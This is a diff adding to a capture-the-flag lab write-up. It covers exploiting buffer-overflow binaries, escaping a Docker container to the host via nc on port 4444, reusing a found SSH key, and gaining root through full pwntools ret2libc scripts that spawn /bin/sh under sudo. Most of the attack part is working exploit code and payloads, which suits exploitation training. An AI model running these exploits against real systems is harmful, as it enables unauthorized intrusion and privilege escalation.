@@ -83,8 +83,131 @@ The following pwntools script exploits the binary in my local machine: <br />
     p.sendline(payload)
     p.interactive()
 (notice that I also had to take the address of a ret instruction in order to solve stack alignment issues).<br />
-Now I need to copy the payload in a way that I can exploit in in the target machine (since it doesnt have pwntools). And this is the final payload:
+Now I need to copy the payload in a way that I can exploit it in the target machine (since it doesnt have pwntools). And this is the final payload:
 
     { python2 -c 'print "A" * 128 + "\xd2\x06\x40\x00\x00\x00\x00\x00\x46\x06\x40\x00\x00\x00\x00\x00"'; cat; } | /ret
-I am now root in the docker container, but the flag isn't in the `/root` directory. 
+I honestly don't know why the offset changed from 136 to 128 bytes, but it's worth trying, maybe the compiler in the target machine layed out variables on the stack in a different order. I am now root in the docker container, but the flag isn't in the `/root` directory. It's time to escape. So If I do `ip a`, I can see that the IP for the docker container is `172.17.0.3`. No always, but sometimes the container can communicate with the host machine through the "gateway" of this interface, which is `172.17.0.1`. It seems like there's something there, since it responds to the pings. What I do next is I donwload a static version on `nmap` from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap), and I transfer it to the target machine. I use it on the IP of the host machine and look what I get: <br />
+![image](https://github.com/user-attachments/assets/d8d18464-1cae-4e8a-ae95-166f92ffb5b2)<br />
+There's a port 4444 open, which I didn't see in the nmap scan from my kali machine. Maybe this Port is open only for the docker container. The funny thing is that it's exactly the binary that I just exploited, but it's remote instead of local! To exploit it and get a remote shell, I just need to run `{ python2 -c 'print "A" * 128 + "\xd2\x06\x40\x00\x00\x00\x00\x00\x46\x06\x40\x00\x00\x00\x00\x00"'; cat; } | nc 172.17.0.1 4444`. This gets me access to the host machine as user `zeeshan`, and I get the user.txt flag. I find rsa key inside his .ssh folder so I used to get ssh login so that the shell is a bit more stable. Next, I run `sudo -l` and get this output:<br />
+![image](https://github.com/user-attachments/assets/18c974b4-6e2b-400a-8876-665cfe43d0f4)<br />
+There's another file to exploit with a buffer overflow! Let's exploit it, first I transfer it locally, then I find the offset with the same script I used before:<br />
+![image](https://github.com/user-attachments/assets/68e9f4ec-9f11-42a8-97a5-0152f32c685f)<br />
+It's 40 bytes. The defenses are the same of the previous binary, but this time there's no `win` function. This is a ret2libc attack. The following code exploits the binary on my local machine: <br />
+    
+    from pwn import *
+    
+    elf = context.binary = ELF("./exploit_me")
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    
+    p = process()
+    
+    rop = ROP(elf)
+    rop = ROP(elf)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+    main = elf.sym['main']
+    
+    log.info(f'pop rdi: {hex(pop_rdi)}')
+    log.info(f'puts@plt: {hex(puts_plt)}')
+    log.info(f'puts@got: {hex(puts_got)}')
+    log.info(f'main: {hex(main)}')
+    
+    offset = 40
+    
+    payload1 = flat(
+        b'A' * offset,
+        ret,
+        pop_rdi,
+        puts_got,
+        puts_plt,
+        main
+    )
+    
+    p.recvuntil(b"root!")
+    p.recvline()
+    
+    p.sendline(payload1)
+    
+    puts_leak = u64(p.recv(6) + b'\x00\x00')
+    log.success(f'Leaked puts@libc: {hex(puts_leak)}')
+    
+    libc_base = puts_leak - libc.symbols['puts']
+    system = libc_base + libc.symbols['system']
+    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
+    
+    log.success(f'libc base: {hex(libc_base)}')
+    log.success(f'system: {hex(system)}')
+    log.success(f'/bin/sh: {hex(bin_sh)}')
+    
+    payload2 = flat(
+           b'A' * offset,
+           ret,
+           ret,
+           pop_rdi,
+           bin_sh,
+           system
+       )
+    p.recvuntil(b"root!")
+    p.recvline()
+    p.sendline(payload2)
+    p.interactive()
 
+Now the problem is that the target machine doesn't have pwntools. However I can bypass this problem since I have ssh access to the target machine, and thank god python is a champ. I can set the context of the remote binary, by authenticating with ssh and then set the target process to be a remote one with the command `sudo /exploit_me`. Also, remember to copy the actual libc from the binary itself into your host machine and use that library on the pwntools script. Even one small difference in the library can f**k up the exploit. The final script that exploits the remote buffer overflow is the following: 
+
+    from pwn import *
+    
+    libc = ELF("libc.so.6")
+    
+    s = ssh(host='10.10.116.6',user='zeeshan',keyfile='id_rsa_zeeshan')
+    p = s.process('/home/zeeshan/exploit_me')
+    
+    elf = context.binary = p.elf
+    rop = ROP(elf)
+    
+    p = s.process(argv='sudo /home/zeeshan/exploit_me',shell=True)
+    
+    rop = ROP(elf)
+    rop = ROP(elf)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+    main = elf.sym['main']
+    
+    offset = 40
+    
+    payload1 = flat(
+        b'A' * offset,
+        ret,
+        pop_rdi,
+        puts_got,
+        puts_plt,
+        main
+    )
+    
+    p.recvuntil(b"root!")
+    p.recvline()
+    
+    p.sendline(payload1)
+    
+    puts_leak = u64(p.recv(6) + b'\x00\x00')
+    
+    libc_base = puts_leak - libc.symbols['puts']
+    system = libc_base + libc.symbols['system']
+    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
+    
+    
+    payload2 = flat(
+           b'A' * offset,
+           ret,
+           ret,
+           pop_rdi,
+           bin_sh,
+           system
+       )
+    p.recvuntil(b"root!")
+    p.recvline()
+    p.sendline(payload2)
+    p.interactive()
